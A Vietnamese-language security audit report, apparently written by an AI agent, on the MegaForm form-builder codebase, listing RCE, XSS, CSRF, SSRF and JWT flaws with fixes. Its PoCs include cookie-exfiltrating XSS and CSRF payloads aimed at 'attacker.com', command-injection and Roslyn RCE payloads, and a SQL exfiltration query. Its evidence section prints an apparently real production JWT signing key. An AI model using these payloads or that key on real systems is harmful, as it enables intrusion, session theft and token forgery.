# Báo cáo Rà soát Bảo mật MegaForm — Theo phương pháp Mythos

> **Dự án:** MegaFormSolution_280_Oqtane_um  
> **Ngày rà soát:** 2026-07-01  
> **Phương pháp:** Mythos-style vulnerability discovery (Attack Surface Mapping → Parallel Discovery → Exploitability Validation → Judge Triage)  
> **Ngườiphụ trách:** Kimi Code CLI Security Agent  
> **Giới hạn:** Chỉ phân tích source code (read-only), không thực hiện tấn công thật, không sửa code.

---

## 1. Executive Summary

Codebase MegaForm là một nền tảng xây dựng biểu mẫu đa nền tảng (DNN / Oqtane / ASP.NET Core Web / Umbraco) với nhiều tính năng nâng cao như AI assistant, workflow engine, Razor widget compilation, file upload và tích hợp thanh toán.

Quá trình rà soát theo phương pháp **Mythos** đã phát hiện **6 lỗ hổng P0 (Critical)**, trong đó **3 lỗ hổng có thể khai thác mà không cần xác thực (unauthenticated)**. Ngoài ra còn có nhiều lỗ hổng P1 (High) và P2/P3 (Medium/Low) liên quan đến CSRF, SSRF, XSS, lộ thông tin nhạy cảm và cấu hình không an toàn.

### Tóm tắt rủi ro

| Mức độ Mythos | Số lượng | Mô tả |
|---------------|----------|-------|
| **P0 — Critical** | 6 | RCE, unauthenticated file write, JWT forgery, stored XSS |
| **P1 — High** | 7 | CSRF, admin RCE, SSRF, arbitrary connection string, public upload |
| **P2 — Medium** | 5 | Path traversal, API key leak, verbose errors, CORS/cookie misconfig |
| **P3 — Low** | 3 | TLS/SSL defaults, SMTP SSL, PII leak |
| **Misconfiguration / QA fixtures** | 4 | Hardcoded demo passwords, dev keys, docs credentials |

### Các lỗ hổng cần xử lý ngay lập tức

1. **Oqtane `MegaFormLocalAiController`** — Unauthenticated RCE qua `kimi` CLI shell-out.
2. **Oqtane `UpsertI18nLocale`** — Unauthenticated file write vào `wwwroot`, dẫn đến stored XSS.
3. **Oqtane `RazorWidgetController.Compile`** — Host/Admin RCE qua Roslyn JIT compile `.razor`.
4. **Hardcoded JWT signing key + weak validation** — Token forgery toàn hệ thống.
5. **Web `PrintController.SavePrintSettings`** — Unauthenticated schema mutation → stored XSS.
6. **Stored XSS qua `CustomHtml` / `ModuleCss`** — Admin → user XSS chain.

---

## 2. Phương pháp Mythos đã áp dụng

Phương pháp Mythos trong bối cảnh này được thực hiện qua 4 bước:

### Bước 1 — Attack Surface Mapping
- Quét toàn bộ codebase, xác định stack công nghệ (DNN / Oqtane / ASP.NET Core / Blazor / C# / TypeScript).
- Xếp hạng file theo khả năng chứa lỗ hổng (scale 1–5):
  - **5**: Controller/API endpoint xử lý trực tiếp user input từ network.
  - **4**: Service/repository xử lý dữ liệu user, parsing, workflow/rule engine.
  - **3**: UI component render dữ liệu user.
  - **2**: Helper, utility, config, middleware.
  - **1**: Constants, models, DTOs.
- Kết quả: **Top 46 file** attack surface cao nhất.

### Bước 2 — Parallel Vulnerability Discovery
Chạy 4 agents song song, mỗi agent tập trung vào một lớp lỗ hổng:
- **Agent RCE & Dynamic Code Execution**: Razor compilation, AI CLI shell-out, DDL runner.
- **Agent SQL Injection & DDL**: Unsafe SQL execution, connection string handling, DDL guards.
- **Agent File / Path Traversal / SSRF**: Upload/download, file write, outbound requests, workflow webhooks.
- **Agent Auth / CSRF / XSS / Deserialization**: Authentication bypass, antiforgery, output encoding, deserialization.

Mỗi agent thực hiện theo vòng lặp: **Hypothesize → Validate → PoC → Triage**.

### Bước 3 — Exploitability Validation & Judge Triage
- **Judge Agent** tổng hợp kết quả từ 4 agents.
- Loại bỏ/trùng lặp các findings.
- Đánh giá lại exploitability thực tế (confirmed / potential / false positive).
- Phân tích các chuỗi tấn công (attack chains).
- Sắp xếp lại priority P0 → P3.

### Bước 4 — Structured Mythos Report
- Báo cáo cuối cùng với executive summary, evidence, PoC, khuyến nghị và regulatory mapping (DORA / NIS2 / CRA).

---

## 3. Attack Surface Mapping — Top 46 File

### Điểm 5 — Controller/API endpoint trực tiếp xử lý user input

| # | File | Endpoint/Hàm quan trọng |
|---|------|-------------------------|
| 1 | `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs` | Submit, UploadFile, DownloadFile, SaveForm, TestDatabaseSettings, SaveDatabaseSettings, DevBulkCreateForms |
| 2 | `MegaForm.Web/Controllers/MegaFormController.cs` | Submit/Post, Upload/File, Files/Download, Field/TestInsert, ModuleConfig/DatabaseSettings |
| 3 | `MegaForm.DNN/WebApi/MegaFormApiController.cs` | UploadFile, Download, Save, SaveDatabaseSettings, BulkDelete, SaveViewConfig |
| 4 | `MegaForm.Web/Controllers/AiToolsController.cs` | PreviewSql, DryRunValidate, ExecuteDdl, ProposeTableSchema |
| 5 | `MegaForm.Oqtane.Server/Controllers/AiToolsController.cs` | Tương tự Web |
| 6 | `MegaForm.DNN/WebApi/AiToolsController.cs` | ExecuteDdl, PreviewSql, DryRunValidate, ImportApp |
| 7 | `MegaForm.Web/Controllers/RazorWidgetController.cs` | Render, Compile, Action, Source, Preview |
| 8 | `MegaForm.Oqtane.Server/Controllers/RazorWidgetController.cs` | Tương tự Web |
| 9 | `MegaForm.DNN/WebApi/RazorWidgetController.cs` | Proxy Render/Compile |
| 10 | `MegaForm.DNN/WebApi/SubformController.cs` | Tables, Columns, Compute, Rows, ApplyDdl |
| 11 | `MegaForm.Web/Controllers/SubformController.cs` | Tables, Columns, Compute, Rows |
| 12 | `MegaForm.Oqtane.Server/Controllers/SubformController.cs` | Tương tự Web |
| 13 | `MegaForm.Web/Controllers/AiAssistantController.cs` | LocalCliChat, SaveDefaultConfig, GetDefaultConfig |
| 14 | `MegaForm.Oqtane.Server/Controllers/AiAssistantController.cs` | Tương tự Web |
| 15 | `MegaForm.Web/Controllers/MegaFormLocalAiController.cs` | ChatCompletions, Ping, TryKimiCliAsync |
| 16 | `MegaForm.Web/Controllers/SetupController.cs` | TestConnection, Complete, Reset |
| 17 | `MegaForm.Web/Controllers/AdminAuthController.cs` | Login, Logout, IsValidAdmin |
| 18 | `MegaForm.Web/Controllers/PaymentController.cs` | StripeCreateIntent, PayPalCreateOrder |
| 19 | `MegaForm.Web/Controllers/UserTemplateController.cs` | GetSource, PutSource, Render, Refresh |
| 20 | `MegaForm.DNN/WebApi/UserTemplateController.cs` | source, render, refresh |
| 21–37 | Các controller còn lại | Documents, FormController, PrintController, ReportsController, WorkflowController, AiKnowledgeController, DataRepeaterApiController, DesignerController, v.v. |

### Điểm 4 — Service / Repository xử lý dữ liệu user

| # | File | Chức năng |
|---|------|-----------|
| 38 | `MegaForm.Core/Services/SubmissionProcessor.cs` | Pipeline submit, validate, save, email, webhook, workflow |
| 39 | `MegaForm.Core/Services/FormDatabaseInsertService.cs` | Thực thi INSERT SQL do admin cấu hình |
| 40 | `MegaForm.Core/Services/DataRepeaterService.cs` | Thực thi SQL query từ widget config |
| 41 | `MegaForm.Web/Services/RazorCompilationService.cs` | Roslyn JIT compile Razor source |
| 42 | `MegaForm.Core/Services/WorkflowEngine.cs` | Legacy workflow engine |
| 43 | `MegaForm.Core/Services/WorkflowEngineV2.cs` | Workflow engine V2 |
| 44 | `MegaForm.Core/Services/WebhookService.cs` | Gửi HTTP POST đến URL user-controlled |
| 45 | `MegaForm.Core/Services/EmailNotificationService.cs` | Render email HTML từ template user |
| 46 | `MegaForm.Core/Services/FormHtmlRenderer.cs` | Server-side render form HTML, CustomHtml |

---

## 4. Top Findings — Phân loại theo Mythos Priority

### P0 — Critical (Yêu cầu xử lý ngay lập tức)

#### P0-1: Unauthenticated RCE qua `kimi` CLI (Oqtane)

- **File:** `MegaForm.Oqtane.Server/Controllers/MegaFormLocalAiController.cs`
- **Dòng:** ~240–267 (`TryKimiCliAsync`)
- **Mô tả:** Endpoint `/api/MegaFormAi/chat/completions` được đánh dấu `[AllowAnonymous]` và gọi `Process.Start("kimi", $"chat --no-stream \"{query}\"")` với nội dung user-controlled. Không có env gate như phiên bản Web.
- **Điều kiện khai thác:** Server cài `kimi` CLI trên PATH.
- **PoC:**
  ```http
  POST /api/MegaFormAi/chat/completions HTTP/1.1
  Content-Type: application/json

  {
    "messages": [
      { "role": "user", "content": "hello; whoami" }
    ]
  }
  ```
- **Mythos Severity:** Critical
- **Exploitability:** Unauthenticated
- **Regulatory Trigger:** DORA, NIS2, CRA
- **Khuyến nghị:** Thêm env gate `MEGAFORM_ALLOW_LOCAL_AI_CLI=1` giống Web, yêu cầu `[Authorize]`, dùng `ArgumentList` thay vì `Arguments` string.

#### P0-2: Unauthenticated File Write i18n → Stored XSS (Oqtane)

- **File:** `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs`
- **Dòng:** 785–861 (`UpsertI18nLocale`)
- **Mô tả:** Các endpoint `i18n/create`, `i18n/save`, `i18n/import` thiếu `[Authorize]`, cho phép bất kỳ ai ghi file `.json` vào `wwwroot/Modules/MegaForm/js/builder/i18n/`. Nội dung JSON được parse rồi ghi lại, có thể chứa payload XSS.
- **PoC:**
  ```http
  POST /api/MegaForm/i18n/save HTTP/1.1
  Content-Type: application/json

  {
    "locale": "vi-VN",
    "entries": {
      "mf.builder.save": "<img src=x onerror=alert(document.cookie)>"
    }
  }
  ```
- **Mythos Severity:** Critical
- **Exploitability:** Unauthenticated
- **Regulatory Trigger:** DORA, NIS2, CRA
- **Khuyến nghị:** Thêm `[Authorize(Roles = "Administrator")]` hoặc `[Authorize(Policy = "EditModule")]`. Validate path, không cho phép overwrite `index.json`.

#### P0-3: Roslyn JIT Compile `.razor` → RCE (Oqtane/Web)

- **File:** `MegaForm.Oqtane.Server/Controllers/RazorWidgetController.cs`, `MegaForm.Web/Services/RazorCompilationService.cs`
- **Dòng:** Oqtane ~295–318; Service `Compile`
- **Mô tả:** Admin/Host có thể submit source `.razor`, server biên dịch bằng Roslyn và load assembly trực tiếp vào AppDomain. Code C# trong `@code { ... }` chạy với quyền tiến trình web server.
- **PoC:**
  ```http
  POST /api/MegaFormPopup/RazorWidget/Compile HTTP/1.1
  Content-Type: application/json

  {
    "templateName": "Pwn",
    "source": "@using System.Diagnostics\n@code { protected override void OnInitialized() { Process.Start(\"cmd.exe\", \"/c whoami > C:\\\\pwn.txt\"); } }\n<div>ok</div>"
  }
  ```
- **Mythos Severity:** Critical
- **Exploitability:** Authenticated Host/Admin
- **Regulatory Trigger:** DORA, NIS2, CRA
- **Khuyến nghị:** Không compile request body trực tiếp; nếu cần thì chạy trong sandbox/AppDomain riêng với whitelist API.

#### P0-4: Hardcoded JWT Signing Key + Weak Validation

- **File:** `MegaForm.Web/appsettings.Production.json`, `MegaForm.Web.Host/appsettings.Production.json`, `MegaForm.Web/Program.cs`
- **Dòng:** Production config dòng 14; `Program.cs` 127–135
- **Mô tả:** JWT signing key nằm plaintext trong file config commit vào git. `ValidateIssuer = false`, `ValidateAudience = false` cho phép token từ bất kỳ issuer/audience nào được chấp nhận.
- **PoC:** Forge JWT với key known → gọi API admin.
- **Mythos Severity:** Critical
- **Exploitability:** Unauthenticated
- **Regulatory Trigger:** DORA, NIS2, CRA
- **Khuyến nghị:** Sinh key ngẫu nhiên trong setup wizard, lưu trong secret manager (Azure Key Vault / AWS Secrets Manager / env var). Bật `ValidateIssuer`/`ValidateAudience`.

#### P0-5: `SavePrintSettings` Unauthenticated → Stored XSS / Defacement (Web)

- **File:** `MegaForm.Web/Controllers/PrintController.cs`
- **Dòng:** 76–99
- **Mô tả:** Action `SavePrintSettings` thiếu `[Authorize]`, cho phép bất kỳ ai cập nhật `PrintSettings` trong schema JSON của form. `headerHtml`/`footerHtml` có thể chứa JavaScript.
- **PoC:**
  ```http
  POST /f/1/print/settings HTTP/1.1
  Content-Type: application/json

  {
    "headerHtml": "<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>",
    "enabled": true
  }
  ```
- **Mythos Severity:** Critical
- **Exploitability:** Unauthenticated
- **Regulatory Trigger:** DORA, NIS2
- **Khuyến nghị:** Thêm `[Authorize(Roles = "Administrator")]`, kiểm tra ownership form, validate/encode print settings.

#### P0-6: Stored XSS qua `CustomHtml` / `ModuleCss` / `AutoQrCodeHtml`

- **File:** `MegaForm.Core/Services/FormHtmlRenderer.cs`, `MegaForm.Core/Services/ModuleCssComposer.cs`, `MegaForm.DNN/Views/FormView.ascx`, `MegaForm.Web/Views/Form/View.cshtml`
- **Dòng:** `FormHtmlRenderer.cs` ~124–145; `FormView.ascx` ~632, 659; `View.cshtml` ~91
- **Mô tả:** Server-side renderer chèn `CustomHtml`, `ModuleCss`, `customCss`, `AutoQrCodeHtml` trực tiếp vào HTML/CSS response mà không escape/sanitize. Admin lưu payload → mọi user xem form bị XSS.
- **PoC:** Lưu `CustomHtml` chứa `<script>alert(document.cookie)</script>` trong builder.
- **Mythos Severity:** Critical
- **Exploitability:** Authenticated Admin (hoặc CSRF qua P1-1)
- **Regulatory Trigger:** DORA, NIS2
- **Khuyến nghị:** Dùng HTML sanitizer whitelist (e.g. HtmlSanitizer) cho RichText/Html fields. Escape CSS đặc biệt `<`, `"`, `'`.



### P1 — High (Ưu tiên cao)

#### P1-1: CSRF Toàn Class Oqtane (`[IgnoreAntiforgeryToken]` class-level)

- **File:** `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs` (dòng ~47), `AiToolsController.cs`, `SubformController.cs`, `RazorWidgetController.cs`, `UserTemplateController.cs`, `MegaFormLocalAiController.cs`
- **Mô tả:** Nhiều controller Oqtane đặt `[IgnoreAntiforgeryToken]` ở class-level, vô hiệu hóa antiforgery cho tất cả action. Các endpoint ghi dữ liệu admin (SaveTheme, SaveStyle, SaveForm, Workflow Apply, Upload/Image) bị ảnh hưởng.
- **PoC:**
  ```html
  <form action="https://victim.com/api/MegaForm/ModuleConfig/SaveStyle" method="POST" id="x">
    <input type="hidden" name="moduleId" value="123">
    <input type="hidden" name="formId" value="1">
    <input type="hidden" name="cssOverride" value="body{background:url('https://attacker.com/log?c='+document.cookie)}">
  </form>
  <script>document.getElementById('x').submit();</script>
  ```
- **Mythos Severity:** High
- **Exploitability:** CSRF (cần admin click link)
- **Regulatory Trigger:** DORA, NIS2
- **Khuyến nghị:** Bỏ class-level `[IgnoreAntiforgeryToken]`; chỉ áp dụng cho các endpoint public submit/upload thực sự cần. Thêm `[ValidateAntiForgeryToken]` hoặc antiforgery header cho admin POST.

#### P1-2: Admin Shell-Out `claude` CLI (Web)

- **File:** `MegaForm.Web/Controllers/AiAssistantController.cs`
- **Dòng:** 86–175 (`LocalCliChat`)
- **Mô tả:** Admin có thể gọi `claude` CLI với prompt tùy ý. Có env gate `MEGAFORM_ALLOW_LOCAL_CLI=1`. Prompt injection có thể khiến Claude thực hiện hành động nguy hại.
- **PoC:**
  ```http
  POST /api/AiAssistant/LocalCliChat HTTP/1.1
  Content-Type: application/json

  {
    "prompt": "Write a C# program that reads C:\\\\secret.txt",
    "model": "default",
    "systemPrompt": "You are a helpful coding assistant.",
    "timeoutMs": 60000
  }
  ```
- **Mythos Severity:** High
- **Exploitability:** Authenticated Admin + env gate
- **Regulatory Trigger:** DORA, NIS2
- **Khuyến nghị:** Giữ env gate, thêm timeout ngắn, whitelist commands, cân nhắc xóa endpoint trên production.

#### P1-3: Admin SQL/DDL Execution `AiToolsController.ExecuteDdl`

- **File:** `MegaForm.Oqtane.Server/Controllers/AiToolsController.cs`, `MegaForm.Web/Controllers/AiToolsController.cs`, `MegaForm.DNN/WebApi/AiToolsController.cs`
- **Dòng:** Oqtane ~468–539
- **Mô tả:** `ExecuteDdl` cho phép admin chạy SQL trực tiếp. Guard chặn DROP/TRUNCATE/EXEC nhưng vẫn cho phép `INSERT ... SELECT`, `CREATE INDEX`, `ALTER TABLE ADD`. Regex strip comment non-greedy có thể bị bypass qua nested comments (potential).
- **PoC:**
  ```http
  POST /api/AiTools/ExecuteDdl HTTP/1.1
  Content-Type: application/json

  {
    "sql": "INSERT INTO App_Exfil (DataCol) SELECT ValueText FROM MF_SubmissionValues WHERE FieldKey = 'taxId'",
    "dryRun": false
  }
  ```
- **Mythos Severity:** High
- **Exploitability:** Authenticated Admin
- **Regulatory Trigger:** DORA, NIS2
- **Khuyến nghị:** Dùng SQL parser thực sự thay vì regex. Chỉ cho phép whitelist statement/table.

#### P1-4: SSRF via Workflow Webhook URL Template

- **File:** `MegaForm.Core/Workflow/WebhookNodeExecutor.cs`, `MegaForm.Core/Services/WebhookService.cs`
- **Dòng:** `WebhookNodeExecutor.cs` 54, 182
- **Mô tả:** Workflow webhook URL được resolve từ template `{{fieldKey}}` với context chứa form data. `HttpClient.SendAsync` không validate URL, cho phép gọi internal network/cloud metadata.
- **PoC:** Admin tạo workflow webhook URL `https://{{server}}/api/notify`; attacker submit `server = 169.254.169.254`.
- **Mythos Severity:** High
- **Exploitability:** Authenticated User/Admin
- **Regulatory Trigger:** DORA, NIS2
- **Khuyến nghị:** Validate URL sau khi resolve, deny private IP ranges, localhost, metadata endpoints. Dùng allow-list domain.

#### P1-5: Arbitrary Connection String → SSRF / Lateral Movement

- **File:** `MegaForm.Web/Controllers/MegaFormController.cs`, `MegaForm.Oqtane.Server/Controllers/MegaFormController.ModuleConfigDatabase.cs`
- **Dòng:** Web ~1104–1122; Oqtane ~155–185
- **Mô tả:** `TestDatabaseSettings` nhận connection string từ client và mở real DB connection. Có thể trỏ đến attacker-controlled server để probe nội bộ hoặc leak credential.
- **PoC:**
  ```http
  POST /api/MegaForm/ModuleConfig/DatabaseSettings/Test HTTP/1.1
  Content-Type: application/json

  {
    "provider": "SqlServer",
    "connectionString": "Server=attacker.com,1433;Database=x;User Id=sa;Password=x;Connect Timeout=5;"
  }
  ```
- **Mythos Severity:** High
- **Exploitability:** Authenticated User/Admin
- **Regulatory Trigger:** DORA, NIS2
- **Khuyến nghị:** Không cho phép test connection string tùy ý; chỉ test connection đã lưu server-side hoặc masked.

#### P1-6: Public File Upload cho Draft Form (B267 Gate Removal)

- **File:** `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs`
- **Dòng:** 1488–1502 (`Upload/File`)
- **Mô tả:** Oqtane `Upload/File` cho phép `[AllowAnonymous]` và đã bỏ gate `IsPublished` (B267). Bất kỳ form nào tồn tại đều có thể nhận upload.
- **PoC:** Upload SVG/HTML/JS qua `/api/MegaForm/Upload/File` trên form draft.
- **Mythos Severity:** High
- **Exploitability:** Unauthenticated/Authenticated User
- **Regulatory Trigger:** DORA, NIS2
- **Khuyến nghị:** Khôi phục gate `IsPublished` cho public upload, hoặc yêu cầu auth. Validate content-type/extension chặt.

#### P1-7: UserTemplate `.cshtml` Render (SSTI giới hạn)

- **File:** `MegaForm.Oqtane.Server/Controllers/UserTemplateController.cs`, `MegaForm.Web/Controllers/UserTemplateController.cs`
- **Dòng:** Oqtane ~555–663
- **Mô tả:** UserTemplate render `.cshtml` qua `MegaFormRazorInterpreter` custom (không phải Roslyn). Chỉ yêu cầu `[Authorize]` (any role). Có thể leak object properties hoặc thực hiện reflection fallback.
- **PoC:** Upload template chứa `{{SomeObject.InternalProperty}}`.
- **Mythos Severity:** High
- **Exploitability:** Authenticated User
- **Regulatory Trigger:** DORA, NIS2
- **Khuyến nghị:** Hạn chế quyền edit template chỉ Host/Admin. Sandbox interpreter, giới hạn reflection.

### P2 — Medium

#### P2-1: Path Sanitization Yếu `Files/Download`

- **File:** `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs`, `MegaForm.DNN/WebApi/MegaFormApiController.cs`
- **Dòng:** Oqtane ~1770; DNN ~2989–3001
- **Mô tả:** Dùng `path.Replace("..", "")` thay vì `Path.GetFullPath` containment. Có `[Authorize]` nên không unauth.
- **Mythos Severity:** Medium
- **Exploitability:** Authenticated User
- **Regulatory Trigger:** NIS2
- **Khuyến nghị:** Dùng `Path.GetFullPath(root)` + strict prefix check.

#### P2-2: AI API Key Leak to Client

- **File:** `MegaForm.Web/Controllers/AiAssistantController.cs`, `MegaForm.Oqtane.Server/Controllers/AiAssistantController.cs`
- **Dòng:** Web ~60
- **Mô tả:** `GetDefaultConfig` trả `apiKey` về client cho admin. Key có thể lộ qua DevTools, XSS, browser extension.
- **Mythos Severity:** Medium
- **Exploitability:** Authenticated Admin
- **Regulatory Trigger:** NIS2
- **Khuyến nghị:** Không trả key về client; dùng server-side proxy.

#### P2-3: Verbose Error Leak / Stack Trace

- **File:** `MegaForm.Oqtane.Server/Controllers/RazorWidgetController.cs`, `MegaForm.Web/Controllers/SetupController.cs`, `MegaForm.Oqtane.Server/Controllers/UserTemplateController.cs`, v.v.
- **Dòng:** Nhiều dòng
- **Mô tả:** Nhiều endpoint trả `ex.Message`, `ex.ToString()`, hoặc `"SQL error: " + ex.Message` cho client.
- **Mythos Severity:** Medium
- **Exploitability:** Unauthenticated/Authenticated
- **Regulatory Trigger:** NIS2
- **Khuyến nghị:** Trả generic message client-side; log chi tiết server-side.

#### P2-4: CORS `AllowAnyOrigin` + Cookie `SecurePolicy=SameAsRequest`

- **File:** `MegaForm.Web/Program.cs`
- **Dòng:** 119–121, 150–151
- **Mô tả:** `AllowAnyOrigin().AllowAnyMethod().AllowAnyHeader()` kết hợp cookie `SecurePolicy=SameAsRequest` làm giảm hiệu quả Same-Origin Policy.
- **Mythos Severity:** Medium
- **Exploitability:** CSRF / MitM
- **Regulatory Trigger:** NIS2
- **Khuyến nghị:** CORS whitelist origin cụ thể; production dùng `CookieSecurePolicy.Always`.

#### P2-5: DDL Guard Bypass qua Nested Block Comments

- **File:** `MegaForm.Core/Services/AiAssistant/SqlDdlGuard.cs`, `MegaForm.DNN/WebApi/SubformController.cs`
- **Dòng:** `SqlDdlGuard.cs` ~224–231
- **Mô tả:** Regex strip comment non-greedy `\/\*.*?\*\/` không xử lý nested comments. Tuy nhiên hầu hết SQL engine không hỗ trợ nested comments nên bypass khó thực tế.
- **Mythos Severity:** Medium
- **Exploitability:** Authenticated Admin (potential)
- **Regulatory Trigger:** NIS2
- **Khuyến nghị:** Dùng SQL parser thực sự thay vì regex.

### P3 — Low

#### P3-1: SQL Server `TrustServerCertificate=true` mặc định

- **File:** `MegaForm.Web.Host/appsettings.json`, `MegaForm.Web/appsettings.json`, `MegaForm.Web/Data/DatabaseConfig.cs`
- **Mô tả:** Tắt xác thực certificate SQL Server, dễ bị MitM.
- **Khuyến nghị:** Default `TrustServerCertificate=false`.

#### P3-2: SMTP `EnableSsl=false` mặc định

- **File:** `MegaForm.Web.Host/appsettings.json`, `MegaForm.Web/appsettings.json`, `Samples/CorporateWeb/SetupCompletionService.cs`
- **Mô tả:** Email gửi qua plaintext.
- **Khuyến nghị:** Default `EnableSsl=true`.

#### P3-3: PII Admin Email trong Production Config

- **File:** `MegaForm.Web.Host/appsettings.Production.json`, `MegaForm.Web/appsettings.Production.json`
- **Mô tả:** Email admin cá nhân lộ trong config.
- **Khuyến nghị:** Dùng placeholder hoặc email công ty.

### Misconfigurations / QA Fixtures (Không phải lỗ hổng production)

| Finding | Lý do |
|---------|-------|
| Hardcoded QA passwords (`MegaForm!2026`) trong `Index.razor` | QA fixtures, cần đảm bảo không build vào production |
| Hardcoded admin password `admin123` trong sample projects | Demo/sample only |
| Hardcoded passwords trong QA scripts (`abc@ABC1024`, `Minh@2002`, `dnnhost`) | Dev/QA automation scripts |
| IIS Express `AesProvider` keys trong `.vs/` | Local dev keys, nên thêm `.vs/` vào `.gitignore` |
| Credentials trong docs/handoff markdown | Documentation risk |

---

## 5. Chain Analysis — Các chuỗi tấn công nguy hiểm

### Chain A: Unauthenticated RCE (Oqtane)
```
POST /api/MegaFormAi/chat/completions
  → MegaFormLocalAiController.ChatCompletions()
  → TryKimiCliAsync(query)
  → Process.Start("kimi", "chat --no-stream \"<payload>\"")
```
**Impact:** RCE không cần auth. `kimi` CLI có thể đọc/ghi file, gọi tool, thực thi lệnh tùy ý.

### Chain B: Public i18n Write → Stored XSS → Admin Session Hijack
```
POST /api/MegaForm/i18n/save { locale: "vi-VN", entries: { "x": "<img src=x onerror=fetch('//evil?c='+localStorage.getItem('auth'))>" } }
  → UpsertI18nLocale() ghi vào wwwroot/Modules/MegaForm/js/builder/i18n/vi-VN.json
  → Admin mở Language Manager / builder
  → JS render string độc hại trong ngữ cảnh admin
  → Cookie/token bị exfil
```
**Impact:** Unauthenticated → stored XSS → admin compromise.

### Chain C: CSRF Oqtane → Save CSS/CustomHtml → Stored XSS
```
[IgnoreAntiforgeryToken] class-level trên MegaFormController
  → Attacker dụ admin click link/malicious site
  → POST /api/MegaForm/Form (SaveForm) với CustomHtml chứa XSS
  → Hoặc POST /api/MegaForm/Theme với customCss/moduleCss override
  → Victim users/admin bị XSS khi render form
```
**Impact:** CSRF → stored XSS → session hijack / defacement.

### Chain D: Hardcoded JWT Key → Forge Admin Token → Full Admin Access
```
Đọc appsettings.Production.json (từ source leak / backup / git history)
  → SymmetricSecurityKey known
  → Forge JWT với role "Administrator" / "Host"
  → Gọi các endpoint [Authorize] hoặc [Authorize(Roles="Administrator")]
```
**Impact:** Unauthenticated → admin privilege escalation.

### Chain E: User Upload Policy Change → Malicious File Upload
```
Attacker có account bình thường
  → POST /api/MegaForm/ModuleConfig/UploadSettings (chỉ cần [Authorize])
  → Thay đổi allowed/blocked extensions
  → Upload SVG/HTML/JS qua /api/MegaForm/Upload/File
```
**Impact:** Stored XSS, malware upload.

### Chain F: Workflow Webhook → SSRF / Lateral Movement
```
Submitter nhập payload vào form field
  → Workflow trigger WebhookNodeExecutor
  → ResolveTemplate(config.Url, ctx) thay thế token bằng form data
  → URL trỏ đến internal service (localhost, metadata, cloud API)
  → HttpClient gửi request từ server
```
**Impact:** SSRF nội bộ, gọi metadata cloud, exfiltrate dữ liệu.

### Chain G: TestDatabaseSettings → SSRF / Credential Harvesting
```
POST /api/MegaForm/ModuleConfig/DatabaseSettings/Test
  → connectionString trỏ đến attacker-controlled server
  → Server mở connection đến host/port tùy ý
  → Attacker nhận được credential/probe response
```
**Impact:** Lateral movement, port scan nội bộ, credential leak.



## 6. Evidence & PoC Details

### 6.1 Oqtane `MegaFormLocalAiController` — Unauthenticated RCE

**File:** `MegaForm.Oqtane.Server/Controllers/MegaFormLocalAiController.cs`

```csharp
[Route("api/MegaFormAi")]
[IgnoreAntiforgeryToken]
[ApiController]
public class MegaFormLocalAiController : ControllerBase
{
    [HttpPost("chat/completions")]
    [AllowAnonymous]
    public async Task<IActionResult> ChatCompletions([FromBody] ChatRequest request)
    {
        ...
        var result = await TryKimiCliAsync(query);
        ...
    }

    private async Task<string> TryKimiCliAsync(string query)
    {
        var psi = new ProcessStartInfo
        {
            FileName = "kimi",
            Arguments = $"chat --no-stream \"{query.Replace("\"", "\\\"")}\"",
            UseShellExecute = false,
            RedirectStandardOutput = true,
            RedirectStandardError = true
        };
        using var proc = Process.Start(psi);
        ...
    }
}
```

**Nhận xét:** Không có env gate, không auth. Oqtane version dùng `Arguments` string với escaping chỉ thay `"` → `\"`. Backslash không xử lý → argument injection có thể.

### 6.2 Oqtane `UpsertI18nLocale` — Unauthenticated File Write

**File:** `MegaForm.Oqtane.Server/Controllers/MegaFormController.cs`

```csharp
[HttpPost("i18n/create")]
[HttpPost("i18n/save")]
[HttpPost("i18n/import")]
public IActionResult UpsertI18nLocale([FromBody] JsonElement body)
{
    var locale = body.GetProperty("locale").GetString();
    var safeLocale = Regex.Replace(locale, "[^A-Za-z0-9_-]", "");
    var path = Path.Combine(_env.WebRootPath, "Modules", "MegaForm", "js", "builder", "i18n", $"{safeLocale}.json");
    var jsonText = body.GetProperty("jsonText").GetString();
    var jo = JObject.Parse(jsonText);
    File.WriteAllText(path, jo.ToString(Formatting.Indented));
    return Ok();
}
```

**Nhận xét:** Thiếu `[Authorize]`. `safeLocale` giới hạn ký tự nhưng file `.json` vẫn được phục vụ static từ wwwroot.

### 6.3 `RazorCompilationService` — Roslyn JIT Compile

**File:** `MegaForm.Web/Services/RazorCompilationService.cs`

```csharp
var compilation = CSharpCompilation.Create(
    assemblyName,
    new[] { syntaxTree },
    references,
    new CSharpCompilationOptions(OutputKind.DynamicallyLinkedLibrary));

using var ms = new MemoryStream();
var result = compilation.Emit(ms);
ms.Seek(0, SeekOrigin.Begin);
var assembly = Assembly.Load(ms.ToArray());
```

**Nhận xét:** Assembly load trực tiếp vào AppDomain. Code trong `@code { ... }` chạy với full trust của web server process.

### 6.4 Hardcoded JWT Key + Weak Validation

**File:** `MegaForm.Web/appsettings.Production.json`

```json
"Jwt": {
  "Key": "a1rRZ8T5hRe4MzjUAYT22SJ3e1vSg/5Ex/w8C41fkJG3H0rF2P4dZCt0MjqGrHS9",
  "Issuer": "MegaForm",
  "Audience": "MegaForm"
}
```

**File:** `MegaForm.Web/Program.cs`

```csharp
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuer = false,
    ValidateAudience = false,
    ValidateLifetime = true,
    ValidateIssuerSigningKey = true,
    IssuerSigningKey = new SymmetricSecurityKey(Encoding.UTF8.GetBytes(jwtKey))
};
```

**Nhận xét:** Key nằm plaintext trong config. `ValidateIssuer=false` và `ValidateAudience=false` cho phép token từ bất kỳ issuer/audience nào.

### 6.5 Web `PrintController.SavePrintSettings` — Unauthenticated Mutation

**File:** `MegaForm.Web/Controllers/PrintController.cs`

```csharp
[HttpPost("f/{formId}/print/settings")]
public async Task<IActionResult> SavePrintSettings(int formId, [FromBody] PrintSettings settings)
{
    var form = await _formRepo.GetByIdAsync(formId);
    var schema = JsonConvert.DeserializeObject<FormSchema>(form.SchemaJson);
    schema.Settings.PrintSettings = settings;
    form.SchemaJson = JsonConvert.SerializeObject(schema);
    await _formRepo.SaveAsync(form);
    return Ok();
}
```

**Nhận xét:** Không có `[Authorize]`, không kiểm tra ownership, không validate/encode `PrintSettings`.

### 6.6 Oqtane Class-Level `[IgnoreAntiforgeryToken]`

